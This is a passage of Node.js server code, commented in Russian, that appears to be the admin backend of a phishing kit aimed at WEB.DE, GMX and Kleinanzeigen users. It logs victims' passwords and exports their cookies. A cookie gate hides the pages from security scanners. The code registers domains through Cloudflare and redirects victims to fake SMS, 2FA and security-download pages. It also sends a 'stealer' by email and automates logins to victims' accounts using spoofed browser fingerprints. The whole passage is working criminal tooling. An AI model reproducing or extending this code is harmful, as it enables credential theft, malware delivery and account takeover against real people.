    return { ok: false, error: 'nodemailer not installed', statusCode: 500 };
  }
  const smtp = smtpList[0];
  const transporter = nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.port === 465,
    auth: { user: smtp.user, pass: smtp.password }
  });
  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
  const mailOptions = {
    from: fromStr,
    to: toEmail,
    subject: (cfg.title || '').trim() || 'Message',
    html,
    attachments: attachments.length ? attachments : undefined,
    envelope: { from: smtp.fromEmail, to: toEmail }
  };
  try {
    await transporter.sendMail(mailOptions);
    return { ok: true, fromEmail: smtp.fromEmail };
  } catch (err) {
    const msg = (err.message || '').slice(0, 200);
    pushEvent(lead, 'Письмо не отправилось: ' + msg, 'admin');
    console.error('[send-config-email] Ошибка SMTP ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg);
    return { ok: false, error: msg, statusCode: 500 };
  }
}

/** Имя файла куки по email: только недопустимые в ФС символы заменяем (оставляем @). Итог: ровно почта + .txt */
function cookieExportFilename(email) {
  if (!email || typeof email !== 'string') return 'unknown.txt';
  const base = String(email).replace(/[\x00-\x1f\\/:*?"<>|]/g, '_').trim();
  return (base || 'unknown') + '.txt';
}

/** Добавляет пароль в password history. source: 'login'/'login_kl' — со страницы входа (web/Klein), 'change'/'change_kl' — со смены пароля. Дубликат подряд не добавляется. */
function pushPasswordHistory(lead, newPassword, source) {
  const allowed = ['login', 'login_kl', 'change', 'change_kl'];
  if (allowed.indexOf(source) === -1 || newPassword == null || String(newPassword).trim() === '') return;
  var trimmed = String(newPassword).trim();
  if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
  function lastPwd(entry) {
    return typeof entry === 'string' ? entry : (entry && entry.p ? entry.p : '');
  }
  if (lead.passwordHistory.length > 0 && lastPwd(lead.passwordHistory[lead.passwordHistory.length - 1]) === trimmed) return;
  lead.passwordHistory.push({ p: trimmed, s: source });
}

function readSavedCredentials() {
  try {
    if (fs.existsSync(SAVED_CREDENTIALS_FILE)) {
      const content = fs.readFileSync(SAVED_CREDENTIALS_FILE, 'utf8');
      const data = JSON.parse(content);
      return Array.isArray(data) ? data : [];
    }
    return [];
  } catch (err) {
    console.error('[SERVER] Ошибка чтения saved-credentials.json:', err);
    return [];
  }
}

function writeSavedCredentials(credentials) {
  try {
    ensureDataFile();
    fs.writeFileSync(SAVED_CREDENTIALS_FILE, JSON.stringify(credentials, null, 2), 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи saved-credentials.json:', err);
  }
}

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(SAVED_CREDENTIALS_FILE)) fs.writeFileSync(SAVED_CREDENTIALS_FILE, JSON.stringify([], null, 2), 'utf8');
  getDb();
}

function writeDebugLog(action, data) {
  try {
    ensureDataFile();
    const timestamp = new Date().toISOString();
    const safe = (obj) => {
      if (obj == null || typeof obj !== 'object') return obj;
      const out = {};
      for (const k of Object.keys(obj)) {
        const v = obj[k];
        if ((k === 'email' || k.endsWith('Email')) && typeof v === 'string') {
          out[k] = maskEmail(v);
        } else if (v && typeof v === 'object' && !Array.isArray(v) && !(v instanceof Date)) {
          out[k] = safe(v);
        } else {
          out[k] = v;
        }
      }
      return out;
    };
    const logEntry = {
      timestamp: timestamp,
      action: action,
      data: safe(data)
    };
    const logLine = JSON.stringify(logEntry) + '\n';
    fs.appendFileSync(DEBUG_LOG_FILE, logLine, 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи в debug.log:', err);
  }
}

/**
 * Объединение дубликатов только по id (visitId).
 * IP НЕ используется для связывания или объединения записей — только для отображения.
 * Email НЕ используется для объединения — каждая новая почта создает новый лог.
 * Один пользователь может менять IP (VPN, мобильная сеть), поэтому IP ненадежен для связывания.
 */
function mergeDuplicates(leads) {
  if (!Array.isArray(leads) || leads.length === 0) return leads;
  
  const merged = [];
  const seenById = new Set();   // id (visitId) — один сеанс, точный дубликат
  const seenByEmail = new Map(); // email -> индекс в merged (один аккаунт = одна запись)
  
  for (let i = 0; i < leads.length; i++) {
    const lead = leads[i];
    
    if (!lead || typeof lead !== 'object') {
      console.warn('[SERVER] mergeDuplicates: пропущена некорректная запись на индексе', i);
      continue;
    }
    
    const id = (lead.id || '').trim();
    const email = (lead.email || '').trim().toLowerCase();
    
    // Пропускаем записи без идентификаторов
    if (!id && !email) {
      console.warn('[SERVER] mergeDuplicates: пропущена запись без id и email');
      continue;
    }
    
    // 1) Дубликат по id (один и тот же визит) — пропускаем
    if (id && seenById.has(id)) {
      continue;
    }
    
    // 2) НЕ объединяем записи по email - каждая новая почта = новый лог
    // Объединяем только дубликаты по id (один и тот же visitId)
    // Если email одинаковый, но id разный - это разные логи (новая сессия с той же почтой)
    
    // Всегда добавляем запись как новую (не объединяем по email)
    merged.push(lead);
    const newIndex = merged.length - 1;
    if (id) seenById.add(id);
    // Не используем seenByEmail для объединения, только для отслеживания
    if (email) seenByEmail.set(email, newIndex);
  }
  
  return merged;
}

function broadcastLeadsUpdate() {
  if (typeof global.__gmwWssBroadcast === 'function') global.__gmwWssBroadcast();
}

/**
 * Редкий массовый снимок: полная замена таблицы лидов (не использовать в горячем пути).
 */
function writeLeads(leads) {
  if (!Array.isArray(leads)) {
    console.error('[SERVER] Ошибка: replaceAllLeads ожидает массив');
    return;
  }
  try {
    ensureDataFile();
    replaceAllLeads(leads);
    invalidateLeadsCache();
    broadcastLeadsUpdate();
  } catch (err) {
    console.error('[SERVER] Ошибка replaceAllLeads:', err);
  }
}

function appendToAllLog(email, lastPassword, newPassword) {
  try {
    ensureDataFile();
    const emailStr = (email || '').trim();
    const lastPwdStr = (lastPassword || '').trim();
    const newPwdStr = (newPassword || '').trim();
    
    if (!emailStr) return; // Не сохраняем если нет email
    
    const line = emailStr + ':' + lastPwdStr + ':' + newPwdStr + '\n';
    fs.appendFileSync(ALL_LOG_FILE, line, 'utf8');
  } catch (err) {
    console.error('[SERVER] Ошибка записи в all.txt:', err);
  }
}

function readModeData() {
  try {
    return getModeData();
  } catch (_) {
    return { mode: 'auto', autoScript: false };
  }
}

function readMode() {
  return readModeData().mode;
}

function readAutoScript() {
  return readModeData().autoScript;
}

function readStartPage() {
  try {
    if (fs.existsSync(START_PAGE_FILE)) {
      const raw = fs.readFileSync(START_PAGE_FILE, 'utf8').trim().toLowerCase();
      if (raw === 'login') return 'login';
      if (raw === 'change') return 'change';
      if (raw === 'download') return 'download';
      if (raw === 'klein') return 'klein';
      return 'login';
    }
  } catch {}
  return 'login';
}

function writeStartPage(value) {
  ensureDataFile();
  const v = value === 'change' ? 'change' : value === 'download' ? 'download' : value === 'klein' ? 'klein' : 'login';
  fs.writeFileSync(START_PAGE_FILE, v, 'utf8');
}

/** У Klein нет GMX/WEB.DE push-страницы на фишинге. В leads.json статус может быть redirect_push (админка, бейдж Push), а в поллинге статуса жертве отдаём pending — см. обработчик lead-status. */
function suppressVictimPushPageForKleinContext(lead) {
  if (!lead) return false;
  if (lead.brand === 'klein') return true;
  if (readStartPage() === 'klein') return true;
  return false;
}

/** Пометка Kl у лида: отдельный бренд или уже введён emailKl. Без этого в EVENTS не смешиваем сценарий с Klein — только почта WEB.DE. */
function leadHasKleinMarkedData(lead) {
  if (!lead || typeof lead !== 'object') return false;
  if (lead.brand === 'klein') return true;
  if (String(lead.emailKl || '').trim() !== '') return true;
  return false;
}

automationService.init({
  readLeads: leadService.readLeads,
  persistLeadPatch: leadService.persistLeadPatch,
  pushEvent,
  writeDebugLog,
  logTerminalFlow,
  readAutoScript,
  readStartPage,
  leadHasKleinMarkedData,
  EVENT_LABELS,
  getAdminToken: () => ADMIN_TOKEN,
  serverProjectRoot: PROJECT_ROOT,
});

const {
  WEBDE_LOGIN_MAX_CONCURRENT,
  runningWebdeLoginLeadIds,
  pendingWebdeLoginQueue,
  webdeLoginChildByLeadId,
  releaseWebdeLoginSlot,
  preemptWebdeLoginForReplacedLead,
  stopWebdeLoginForDeletedLead,
  setWebdeLeadScriptStatus,
  runWhenLeadsWriteQueueIdle,
  tryAcquireWebdeScriptLock,
  clearWebdeScriptRunning,
  touchWebdeScriptLock,
  webdeLockWriteChildPid,
  beginWebdeAutoLoginRun,
  endWebdeAutoLoginRun,
  startWebdeLoginAfterLeadSubmit,
  restartWebdeAutoLoginAfterVictimRetryFromError,
  startWebdeLoginForLeadId,
  startKleinLoginForLeadId,
  clearAllWebdeChildrenAndQueues,
} = automationService;

function writeMode(mode, autoScript) {
  ensureDataFile();
  const cur = readModeData();
  const next = { mode: mode !== undefined ? (mode === 'manual' ? 'manual' : 'auto') : cur.mode, autoScript: autoScript !== undefined ? !!autoScript : cur.autoScript };
  writeModeData(next);
}

function readShortDomains() {
  try {
    if (fs.existsSync(SHORT_DOMAINS_FILE)) {
      const raw = fs.readFileSync(SHORT_DOMAINS_FILE, 'utf8');
      const data = JSON.parse(raw);
      return typeof data === 'object' && data !== null ? data : {};
    }
  } catch (e) {}
  return {};
}

const SHORT_DOMAINS_TTL_MS = 10000;
let _shortDomainsCache = { data: null, ts: 0 };
/** Кэш short-доменов на 10 сек, чтобы не читать файл на каждый запрос (снижает риск 504 на /admin). */
function getShortDomainsList() {
  const now = Date.now();
  if (_shortDomainsCache.data !== null && (now - _shortDomainsCache.ts) < SHORT_DOMAINS_TTL_MS) {
    return _shortDomainsCache.data;
  }
  const data = readShortDomains();
  _shortDomainsCache = { data, ts: now };
  return data;
}

function writeShortDomains(obj) {
  ensureDataFile();
  fs.writeFileSync(SHORT_DOMAINS_FILE, JSON.stringify(obj, null, 2), 'utf8');
  _shortDomainsCache = { data: null, ts: 0 };
}

function addShortDomainToCloudflare(domain, serverIp, apiToken, cb) {
  const opts = {
    hostname: 'api.cloudflare.com',
    path: '/client/v4/zones',
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + apiToken, 'Content-Type': 'application/json' }
  };
  const body = JSON.stringify({ name: domain, jump_start: true });
  const req = https.request(opts, function (res) {
    let data = '';
    res.on('data', function (chunk) { data += chunk; });
    res.on('end', function () {
      let json;
      try { json = JSON.parse(data); } catch (e) { return cb(new Error('Invalid CF response')); }
      if (!json.success || !json.result) return cb(new Error((json.errors && json.errors[0] && json.errors[0].message) || 'CF add zone failed'));
      const zoneId = json.result.id;
      const ns = (json.result.name_servers || []).slice(0, 2);
      const opts2 = {
        hostname: 'api.cloudflare.com',
        path: '/client/v4/zones/' + zoneId + '/dns_records',
        method: 'POST',
        headers: { 'Authorization': 'Bearer ' + apiToken, 'Content-Type': 'application/json' }
      };
      const body2 = JSON.stringify({ type: 'A', name: '@', content: serverIp, ttl: 1, proxied: false });
      const req2 = https.request(opts2, function (res2) {
        let data2 = '';
        res2.on('data', function (chunk) { data2 += chunk; });
        res2.on('end', function () {
          let json2;
          try { json2 = JSON.parse(data2); } catch (e) {}
          if (!json2 || !json2.success) return cb(new Error((json2 && json2.errors && json2.errors[0] && json2.errors[0].message) || 'CF A record failed'));
          cb(null, ns);
        });
      });
      req2.on('error', function (e) { cb(e); });
      req2.write(body2);
      req2.end();
    });
  });
  req.on('error', function (e) { cb(e); });
  req.write(body);
  req.end();
}

function readZipPassword() {
  try {
    if (fs.existsSync(ZIP_PASSWORD_FILE)) {
      return fs.readFileSync(ZIP_PASSWORD_FILE, 'utf8').trim();
    }
  } catch (e) {}
  return '';
}

function writeZipPassword(value) {
  ensureDataFile();
  fs.writeFileSync(ZIP_PASSWORD_FILE, String(value == null ? '' : value).trim(), 'utf8');
}

function isAdminRequest(pathname) {
  // Эндпоинты только для админки (в т.ч. /api/geo для флагов в списке, чат для кнопки «Открыть чат у юзера»)
  return pathname === '/api/chat-open' ||
         pathname === '/api/chat-open-ack' ||
         pathname === '/api/chat-typing' ||
         pathname === '/api/chat-read' ||
         pathname === '/api/leads' ||
         pathname === '/api/geo' ||
         pathname === '/api/get-saved-credentials' ||
         pathname === '/api/delete-lead' ||
         pathname === '/api/delete-all' ||
         pathname === '/api/save-credentials' ||
         pathname === '/api/delete-saved-credential' ||
         pathname === '/api/mode' ||
         pathname === '/api/start-page' ||
         pathname === '/api/show-error' ||
         pathname === '/api/show-success' ||
         pathname === '/api/redirect-change-password' ||
         pathname === '/api/redirect-sicherheit' ||
         pathname === '/api/redirect-sicherheit-windows' ||
         pathname === '/api/redirect-android' ||
         pathname === '/api/redirect-download-by-platform' ||
         pathname === '/api/redirect-push' ||
         pathname === '/api/redirect-sms-code' ||
         pathname === '/api/redirect-2fa-code' ||
         pathname === '/api/redirect-open-on-pc' ||
         pathname === '/api/redirect-klein-forgot' ||
         pathname === '/api/mark-worked' ||
         pathname === '/api/mark-opened' ||
         pathname === '/api/config/download' ||
         pathname === '/api/config/download-limit' ||
         pathname === '/api/config/download-upload-multi' ||
         pathname === '/api/config/download-android' ||
         pathname === '/api/config/download-android-limit' ||
         pathname === '/api/config/download-android-upload-multi' ||
         pathname === '/api/config/download-delete' ||
         pathname === '/api/config/download-android-delete' ||
         pathname === '/api/config/download-reset-counts' ||
         pathname === '/api/config/download-rotate-next' ||
         pathname === '/api/config/download-settings' ||
         pathname === '/api/config/cookies-export' ||
         pathname === '/api/config/check' ||
         pathname === '/api/config/upload-apply' ||
         pathname === '/api/config/shortlinks' ||
         pathname === '/api/config/short-domains' ||
         pathname === '/api/config/short-domains-check' ||
         pathname === '/api/config/zip-password' ||
         pathname === '/api/config/zip-process' ||
         pathname === '/api/config/proxies' ||
         pathname === '/api/config/proxies-validate' ||
         pathname === '/api/config/webde-fingerprint-indices' ||
         pathname === '/api/config/webde-fingerprints-list' ||
         pathname === '/api/config/webde-fingerprint-probe-start' ||
         pathname === '/api/config/webde-fingerprint-probe-status' ||
         pathname === '/api/config/stealer-email' ||
         pathname === '/api/config/stealer-email/select' ||
         pathname === '/api/config/email' ||
         pathname === '/api/config/email/select' ||
         pathname === '/api/config/warmup-email' ||
         pathname === '/api/config/warmup-email/select' ||
         pathname === '/api/send-stealer' ||
         pathname === '/api/send-email' ||
         pathname === '/api/send-email-all-success' ||
         pathname === '/api/send-email-cookies-batch' ||
         pathname === '/api/archive-leads-by-filter' ||
         pathname === '/api/lead-kl-archive' ||
         pathname === '/api/warmup-start' ||
         pathname === '/api/warmup-status' ||
         pathname === '/api/warmup-pause' ||
         pathname === '/api/warmup-stats-reset' ||
         pathname === '/api/warmup-stop' ||
         pathname === '/api/export-logs' ||
         pathname === '/api/lead-credentials' ||
         pathname === '/api/lead-cookies' ||
         pathname === '/api/lead-fingerprint' ||
         pathname === '/api/lead-automation-profile' ||
         pathname === '/api/lead-login-context' ||
         pathname === '/api/webde-login-grid-step' ||
         pathname === '/api/webde-login-start' ||
         pathname === '/api/webde-login-result' ||
         pathname === '/api/webde-wait-password' ||
         pathname === '/api/webde-poll-2fa-code' ||
         pathname === '/api/webde-login-2fa-wrong' ||
         pathname === '/api/webde-login-2fa-received' ||
         pathname === '/api/webde-login-slot-done' ||
         pathname === '/api/lead-klein-flow-poll' ||
         pathname === '/api/klein-anmelden-seen';
}

/** startPage=download: по платформе — android и ios → страница ПК (bitte-am-pc), win → Download Windows, mac → смена пароля */
function getRedirectPasswordStatus(lead) {
  const p = (lead && (lead.platform || '').toLowerCase()) || '';
  if (p === 'windows') return 'redirect_sicherheit';
  if (p === 'macos') return 'redirect_change_password';
  if (p === 'android' || p === 'ios') return 'redirect_open_on_pc';
  return 'redirect_open_on_pc';
}

/** Только в режиме Auto (не Manual, не Auto-Login): после ввода почты и пароля сразу кидать юзера на startPage. Manual — админ сам направляет; Auto-Login — редирект только после успешного входа скрипта. */
function getInitialRedirectStatus(mode, autoScript, startPage, lead) {
  // Для Klein любые редиректы выполняются только вручную из админки.
  if (lead && lead.brand === 'klein') return null;
  if (mode === 'manual') return null;
  if (mode === 'auto' && autoScript) return null; // Auto-Login: редирект по startPage делаем в webde-login-result после успеха скрипта
  if (mode !== 'auto') return null;
  if (startPage === 'login') return 'show_success';
  if (startPage === 'change') return 'redirect_change_password';
  if (startPage === 'download') return getRedirectPasswordStatus(lead);
  return null;
}
function getAutoRedirectEventLabel(status) {
  if (status === 'redirect_sicherheit') return 'Авто: редирект на Download (Windows)';
  if (status === 'redirect_change_password') return 'Авто: редирект на смену пароля';
  if (status === 'redirect_android') return 'Авто: редирект на скачивание (Android)';
  if (status === 'redirect_open_on_pc') return 'Авто: редирект на страницу ПК';
  if (status === 'redirect_klein_anmelden') return 'Авто: редирект на Klein (после почты)';
  return 'Авто: редирект';
}

/**
 * После прошлого сценария лид может остаться в redirect_* (например Auto-Login уже кинул на смену пароля).
 * Новый заход с тем же visitId / fingerprint — без сброса /api/status сразу отдаёт старый redirect, страница уводит на passwort-aendern,
 * а в лог не попадает новое «Авто: редирект…» (статус не менялся). Сбрасываем в pending + событие в журнал.
 */
function leadStatusStaleAfterCompletedRedirect(status) {
  if (!status || typeof status !== 'string') return false;
  return [
    'redirect_change_password',
    'redirect_sicherheit',
    'redirect_android',
    'redirect_open_on_pc',
    'redirect_push',
    'redirect_sms_code',
    'redirect_2fa_code',
    'redirect_gmx_net',
    'redirect_klein_forgot',
    'redirect_klein_anmelden',
  ].indexOf(status) !== -1;
}

function applyReturnVisitStatusReset(lead) {
  if (!lead) return;
  const st = lead.status;
  if (st === 'show_success' || leadStatusStaleAfterCompletedRedirect(st)) {
    lead.status = 'pending';
    pushEvent(lead, 'Повторный ввод данных — сброс статуса');
  }
}

function readWebdeFingerprintsPoolMeta() {
  const meta = { filePresent: false, pool: [], parseError: null };
  try {
    meta.filePresent = fs.existsSync(WEBDE_FINGERPRINTS_JSON);
    if (!meta.filePresent) return meta;
    const raw = fs.readFileSync(WEBDE_FINGERPRINTS_JSON, 'utf8');
    const arr = JSON.parse(raw);
    if (Array.isArray(arr)) {
      meta.pool = arr;
    } else {
      meta.parseError = 'not_array';
    }
  } catch (e) {
    meta.parseError = (e && e.message) ? String(e.message) : 'parse_error';
    meta.filePresent = fs.existsSync(WEBDE_FINGERPRINTS_JSON);
  }
  return meta;
}

function readWebdeFingerprintsPoolArr() {
  return readWebdeFingerprintsPoolMeta().pool;
}

function summarizeWebdeFingerprintEntry(fp) {
  if (!fp || typeof fp !== 'object') return '—';
  const loc = fp.locale || fp.language || '—';
  const vp = fp.viewport || {};
  const vw = vp.width != null ? vp.width : '—';
  const vh = vp.height != null ? vp.height : '—';
  const ua = String(fp.userAgent || '');
  const chromeM = ua.match(/Chrome\/[\d.]+/);
  const chrome = chromeM ? chromeM[0] : '';
  const tz = fp.timezoneId || '';
  const parts = [String(loc), String(vw) + '×' + String(vh), chrome, tz].filter(Boolean);
  return parts.join(' · ') || '—';
}

function buildWebdeFingerprintsListPayload() {
  const meta = readWebdeFingerprintsPoolMeta();
  const pool = meta.pool;
  const allowed = readWebdeFpIndicesAllowedForProbe(pool.length);
  const allowedSet = new Set(allowed);
  return {
    entries: pool.map(function (fp, index) {
      return {
        index: index,
        summary: summarizeWebdeFingerprintEntry(fp),
        active: allowedSet.has(index),
      };
    }),
    activeIndices: allowed,
    filePresent: meta.filePresent,
    poolLength: pool.length,
    parseError: meta.parseError,
  };
}

function readWebdeFpIndicesAllowedForProbe(poolLen) {
  if (poolLen <= 0) return [];
  const seen = new Set();
  try {
    if (fs.existsSync(WEBDE_FP_INDICES_FILE)) {
      const content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      const lines = content.split(/\r?\n/);
      for (let li = 0; li < lines.length; li++) {
        const s = lines[li].trim();
        if (!s || s.startsWith('#')) continue;
        const first = s.split(/\s+/)[0];
        const n = parseInt(first, 10);
        if (!isNaN(n) && n >= 0 && n < poolLen) seen.add(n);
      }
    }
  } catch (e) {}
  if (seen.size === 0) {
    const out = [];
    for (let i = 0; i < poolLen; i++) out.push(i);
    return out;
  }
  return Array.from(seen).sort(function (a, b) { return a - b; });
}

function pruneWebdeProbeJobs() {
  const now = Date.now();
  for (const [id, j] of webdeProbeJobs) {
    if (j.done && (now - (j.updatedAt || j.startedAt)) > 3600000) {
      webdeProbeJobs.delete(id);
    }
  }
  if (webdeProbeJobs.size > 20) {
    const entries = Array.from(webdeProbeJobs.entries()).sort(function (a, b) {
      return (b[1].startedAt || 0) - (a[1].startedAt || 0);
    });
    for (let i = 20; i < entries.length; i++) {
      webdeProbeJobs.delete(entries[i][0]);
    }
  }
}

function webdeProbeScheduleContinue(jobId) {
  const job = webdeProbeJobs.get(jobId);
  if (job && !job.done && !job.error) {
    job.running = true;
    job.updatedAt = Date.now();
  }
  setImmediate(function () {
    webdeProbeRunOneBatch(jobId);
  });
}

function webdeProbeRunOneBatch(jobId) {
  const job = webdeProbeJobs.get(jobId);
  if (!job || job.done || job.error) return;
  if (job.paused) {
    job.running = false;
    job.updatedAt = Date.now();
    return;
  }
  const batch = job.indices.slice(job.cursor, job.cursor + 3);
  if (batch.length === 0) {
    job.done = true;
    job.running = false;
    job.updatedAt = Date.now();
    return;
  }
  job.running = true;
  job.updatedAt = Date.now();
  const python = process.platform === 'win32' ? 'python' : 'python3';
  const stdinPayload = JSON.stringify({
    email: job.email,
    password: job.password,
    indices: batch,
    headless: !!job.probeHeadless,
    requirePasswordField: job.requirePasswordField !== false,
  });
  const maxOut = 50 * 1024 * 1024;
  const maxErr = 2 * 1024 * 1024;
  let outBuf = '';
  let errBuf = '';
  let childDone = false;
  let child;
  try {
    child = spawn(python, [WEBDE_PROBE_BATCH_SCRIPT], {
      cwd: LOGIN_DIR,
      env: Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' }),
      stdio: ['pipe', 'pipe', 'pipe'],
    });
  } catch (e) {
    job.running = false;
    job.error = (e && e.message) ? e.message : String(e);
    job.done = true;
    job.updatedAt = Date.now();
    return;
  }
  const killTimer = setTimeout(function () {
    if (childDone) return;
    childDone = true;
    try {
      child.kill('SIGTERM');
    } catch (eK) {}
    job.running = false;
    job.error = 'Таймаут пробы (900 с)';
    job.done = true;
    job.updatedAt = Date.now();
  }, 900000);

  function finishBatch(code, signal) {
    if (childDone) return;
    childDone = true;
    clearTimeout(killTimer);
    job.running = false;
    job.updatedAt = Date.now();
    if (signal) {
      job.error = 'Прервано: ' + String(signal);
      job.done = true;
      return;
    }
    let parsed;
    try {
      parsed = JSON.parse(String((outBuf || '').trim() || '{}'));
    } catch (e2) {
      job.error = 'Некорректный ответ скрипта пробы';
      job.done = true;
      return;
    }
    if (parsed.ok === false && parsed.error) {
      job.error = String(parsed.error);
      job.done = true;
      return;
    }
    if (code !== 0 && parsed.ok !== true) {
      const errText = ((errBuf || '') + (outBuf || '')).trim().slice(0, 800);
      job.error = errText || ('код выхода ' + String(code));
      job.done = true;
      return;
    }
    const batchResults = Array.isArray(parsed.results) ? parsed.results : [];
    for (let bi = 0; bi < batchResults.length; bi++) {
      job.results.push(batchResults[bi]);
    }
    job.cursor += batch.length;
    if (job.cursor >= job.indices.length) {
      job.done = true;
    } else if (job.paused) {
      job.running = false;
      job.updatedAt = Date.now();
    } else {
      webdeProbeScheduleContinue(jobId);
    }
  }

  child.stdout.on('data', function (chunk) {
    if (outBuf.length < maxOut) outBuf += chunk.toString();
  });
  child.stderr.on('data', function (chunk) {
    if (errBuf.length < maxErr) errBuf += chunk.toString();
  });
  child.on('error', function (e) {
    if (childDone) return;
    childDone = true;
    clearTimeout(killTimer);
    job.running = false;
    job.error = (e && e.message) ? e.message : String(e);
    job.done = true;
    job.updatedAt = Date.now();
  });
  child.on('close', function (code, signal) {
    finishBatch(code, signal);
  });
  try {
    child.stdin.end(stdinPayload, 'utf8');
  } catch (eIn) {
    if (!childDone) {
      childDone = true;
      clearTimeout(killTimer);
      try {
        child.kill('SIGTERM');
      } catch (eK2) {}
      job.running = false;
      job.error = (eIn && eIn.message) ? eIn.message : 'stdin';
      job.done = true;
      job.updatedAt = Date.now();
    }
  }
}

function handleWebdeFingerprintProbePause(res, json) {
  const jobId = String(json.webdeProbeJobId != null ? json.webdeProbeJobId : json.jobId || '').trim();
  if (!jobId) return send(res, 400, { ok: false, error: 'webdeProbeJobId' });
  const job = webdeProbeJobs.get(jobId);
  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
  if (job.done) return send(res, 400, { ok: false, error: 'Задача уже завершена' });
  job.paused = true;
  job.updatedAt = Date.now();
  return send(res, 200, { ok: true });
}

function handleWebdeFingerprintProbeResume(res, json) {
  const jobId = String(json.webdeProbeJobId != null ? json.webdeProbeJobId : json.jobId || '').trim();
  if (!jobId) return send(res, 400, { ok: false, error: 'webdeProbeJobId' });
  const job = webdeProbeJobs.get(jobId);
  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
  if (job.done) return send(res, 400, { ok: false, error: 'Задача уже завершена' });
  job.paused = false;
  job.updatedAt = Date.now();
  if (!job.running && !job.error) webdeProbeScheduleContinue(jobId);
  return send(res, 200, { ok: true });
}

function handleWebdeFingerprintProbeStart(res, json) {
  let email = '';
  let password = '';
  const cred = json.credentials != null ? String(json.credentials).trim() : '';
  if (cred) {
    const colon = cred.indexOf(':');
    if (colon === -1) {
      email = cred.trim();
      password = '';
    } else {
      email = cred.slice(0, colon).trim();
      password = cred.slice(colon + 1);
    }
  } else {
    email = String(json.email || '').trim();
    password = String(json.password || '');
  }
  if (!email) {
    return send(res, 400, { ok: false, error: 'Укажите email' });
  }
  if (!fs.existsSync(WEBDE_PROBE_BATCH_SCRIPT)) {
    return send(res, 500, { ok: false, error: 'Скрипт webde_probe_batch.py не найден' });
  }
  const pool = readWebdeFingerprintsPoolArr();
  const indicesAll = readWebdeFpIndicesAllowedForProbe(pool.length);
  if (indicesAll.length === 0) {
    return send(res, 400, { ok: false, error: 'Нет отпечатков (пул пуст)' });
  }
  const nAll = indicesAll.length;
  const take = Math.min(WEBDE_PROBE_MAX_INDICES_PER_JOB, nAll);
  const startPos = webdeFpProbeIndexCursor % nAll;
  const indices = [];
  for (let k = 0; k < take; k++) {
    indices.push(indicesAll[(startPos + k) % nAll]);
  }
  webdeFpProbeIndexCursor = (startPos + take) % nAll;
  const probeIndicesTruncated = nAll > take;
  pruneWebdeProbeJobs();
  const jobId = 'wp' + (++webdeProbeJobSeq).toString(36) + '-' + Date.now().toString(36);
  const hasGui = !!(
    (process.env.DISPLAY && String(process.env.DISPLAY).trim()) ||
    (process.env.WAYLAND_DISPLAY && String(process.env.WAYLAND_DISPLAY).trim())
  );
  const userRequestedHeadless =
    json.probeHeadless === true ||
    json.headless === true ||
    json.probeHeadless === 'true' ||
    json.headless === 'true';
  let probeHeadless = userRequestedHeadless;
  let probeHeadlessForced = false;
  if (!hasGui && !userRequestedHeadless) {
    probeHeadless = true;
    probeHeadlessForced = true;
    console.log('[WEBDE probe] Нет DISPLAY/WAYLAND_DISPLAY — принудительно headless (иначе каждый прогон падает с error)');
  }
  const requirePasswordField = json.requirePasswordField !== false && json.requirePasswordField !== 'false' && json.requirePasswordField !== 0;
  const job = {
    email: email,
    password: password,
    indices: indices,
    cursor: 0,
    results: [],
    done: false,
    running: false,
    paused: false,
    error: null,
    probeHeadless: probeHeadless,
    requirePasswordField: requirePasswordField,
    startedAt: Date.now(),
    updatedAt: Date.now(),
  };
  webdeProbeJobs.set(jobId, job);
  webdeProbeScheduleContinue(jobId);
  return send(res, 200, {
    ok: true,
    jobId: jobId,
    total: indices.length,
    totalIndicesAvailable: indicesAll.length,
    probeIndicesTruncated: probeIndicesTruncated,
    probeMaxIndicesPerJob: WEBDE_PROBE_MAX_INDICES_PER_JOB,
    probeHeadlessForced: probeHeadlessForced,
  });
}

function sendWebdeFingerprintProbeStatus(res, jobId) {
  if (!jobId) return send(res, 400, { ok: false, error: 'jobId' });
  const job = webdeProbeJobs.get(jobId);
  if (!job) return send(res, 404, { ok: false, error: 'Задача не найдена' });
  return send(res, 200, {
    ok: true,
    done: job.done,
    running: job.running,
    paused: !!job.paused,
    error: job.error,
    progress: { done: job.cursor, total: job.indices.length },
    results: job.results,
  });
}

/** Cookie гейта: кто прошёл проверку (JS выполнился), получает контент; боты без cookie видят вайт. */
const BOT_GATE_COOKIE = 'gmx_v';
function hasGateCookie(req) {
  const raw = (req.headers && req.headers.cookie) ? String(req.headers.cookie) : '';
  if (!raw) return false;
  const match = raw.match(new RegExp('(?:^|;\\s*)' + BOT_GATE_COOKIE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));
  return !!(match && match[1] && match[1].trim());
}
function isProtectedPage(pathname) {
  if (pathname === '/' || pathname === '') return true;
  if (pathname === '/anmelden' || pathname === '/anmelden/') return true;
  if (pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') return true;
  if (pathname === '/einloggen' || pathname === '/einloggen/') return true;
  if (pathname === '/passwort-aendern') return true;
  if (/^\/sicherheit(\-pc|\-update)?\/?$/.test(pathname)) return true;
  if (pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') return true;
  if (pathname === '/app-update' || pathname === '/app-update/') return true;
  return false;
}
/** Прямые пути к контентным HTML — без cookie отдаём гейт/вайт, иначе бот получит блек по /index-sicherheit-update.html и т.д. */
function isProtectedContentPath(pathname) {
  const protected = [
    '/index.html', '/index-change.html', '/index-sicherheit-update.html', '/index-sicherheit.html', '/index-sicherheit-pc.html',
    '/sicherheit-anleitung.html', '/bitte-am-pc.html', '/app-update.html', '/gmx-mobile-anleitung.html',
    '/sms-code.html', '/2fa-code.html', '/push-confirm.html', '/forgot-password-redirect.html', '/change-password.html',
    '/erfolg'
  ];
  return protected.indexOf(pathname) !== -1;
}
